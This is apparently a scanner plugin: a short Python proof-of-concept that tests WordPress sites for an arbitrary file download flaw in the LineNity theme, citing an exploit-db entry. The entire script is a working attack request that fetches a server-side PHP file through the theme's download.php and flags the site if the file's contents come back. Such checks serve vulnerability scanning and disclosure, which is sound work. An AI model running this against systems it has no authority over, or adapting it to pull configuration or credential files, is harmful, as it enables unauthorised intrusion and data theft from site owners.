#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
POC Name  :  WordPress LineNity主题 任意文件包含漏洞 POC
Reference  :  http://www.exploit-db.com/exploits/32861/
"""

import re

def assign(service, arg):
    if service == "wordpress":
        return True, arg

def audit(arg):
    url = arg
    filename = 'theme-functions.php'
    verify_url = url + ('/wp-content/themes/linenity/functions/download.php?imgurl=%s&name=%s' % (filename, filename) )
    code, head, res, errcode, _ = curl.curl(verify_url)
    if re.findall('gplab_changeInsert', res):
        if re.findall('box_excerpt_append', res):
            security_hole(verify_url)

if __name__=='__main__':
    from dummy import *
    audit(assign('wordpress', 'http://www.example.com/')[1])